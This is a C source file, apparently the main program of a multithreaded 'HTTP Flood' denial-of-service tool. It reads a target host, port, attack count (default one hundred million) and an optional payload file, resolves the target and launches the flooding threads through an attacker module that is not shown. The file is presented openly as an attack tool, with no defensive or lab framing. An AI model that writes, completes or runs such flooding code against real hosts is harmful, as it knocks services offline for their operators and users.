#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/time.h>

#include "attacker/attacker.h"
#include "color.h"


// Prints the banner of the tool
void print_banner(void) {
    printf( "%s= = = = = = = = = = = = = = = = = = = =\n"
            "%s              HTTP Flood               \n"
            "%s= = = = = = = = = = = = = = = = = = = =\n"
            "%s", CYAN, LIGHT_RED, CYAN, NO_COLOR);
}


// Prints the help string
void print_help(void) {
    printf("Usage: http-flood <host> [port] [number of attacks] [payload file]\n");
    // TODO improve help string
}


char *read_file(char *filename) {
    FILE *file;
    int file_size;
    size_t i;
    char c, *content;

    file = fopen(filename, "r");
    if (file == NULL) return NULL;

    fseek(file, 0, SEEK_END); // set the stream position to the end of the file
    file_size = ftell(file);  // returns the position
    fseek(file, 0, SEEK_SET); // set the stream position to the beginning of the file

    content = (char *) malloc(sizeof(char) * (file_size+3)); // +3 to add \n\n and \0
    i = 0;
    // Read all the characters from the file
    while ((c = fgetc(file)) != EOF) {
        content[i] = c;
        i++;
    }
    content[i] = '\n';
    content[i+1] = '\n';
    content[i+2] = '\0';

    fclose(file);
    return content;
}


int main(int argc, char *argv[]) {
    struct timeval start, end;
    gettimeofday(&start, NULL);

    char *payload_filename;
    size_t num_attacks;

    struct hostent *host_entry;

    struct thread_args t_args;

    // default values
    t_args.port = 80;
    num_attacks = 100000000;
    t_args.payload = NULL;

    // if user doens't specifies host
    if (argc <= 1) {
        print_help();
        exit(1);
    }

    t_args.host = argv[1];

    if (argc > 2) {
        t_args.port = atoi(argv[2]);
    }
    if (argc > 3) {
        num_attacks = atoll(argv[3]);
    }
    if (num_attacks < 100) {
        printf("Number of attacks must be at least 100\n");
        exit(1);
    }
    if (argc > 4) {
        payload_filename = argv[4];
        t_args.payload = read_file(payload_filename);
    }

    // set the amount of threads after setting the amount of attacks
    t_args.requests_per_thread = num_attacks / NUM_THREADS;

    // get ip from host_entry converting array of address in to in_addr and the 
    // converting to ascii (inet_ntoa)
    host_entry = gethostbyname(t_args.host);
    if (host_entry == NULL) {
        printf("Invalid host!\n");
        exit(1);
    }
    t_args.ip = inet_ntoa(*((struct in_addr*) host_entry->h_addr_list[0]));

    print_banner();
    printf( "host: %s%s%s\n"
            "ip: %s%s%s\n"
            "port: %s%d%s\n"
            "Number of attacks: %s%ld%s\n"
            "Threads: %s%d%s\n"
            "Requests per thread: %s%ld%s\n",
            LIGHT_GREEN, t_args.host, NO_COLOR, LIGHT_GREEN, t_args.ip, NO_COLOR,
            YELLOW, t_args.port, NO_COLOR, LIGHT_RED, num_attacks, NO_COLOR,
            LIGHT_BLUE, NUM_THREADS, NO_COLOR,
            LIGHT_BLUE, t_args.requests_per_thread, NO_COLOR);

    printf("Attacking...\n");
    usleep(1500 * 1000); // wait 1500 milliseconds to run

    run_threads(t_args);

    printf("=======================================\n");

    gettimeofday(&end, NULL);
    printf("Attack has finished in %ld seconds\n", (end.tv_sec - start.tv_sec));
    return 0;
}
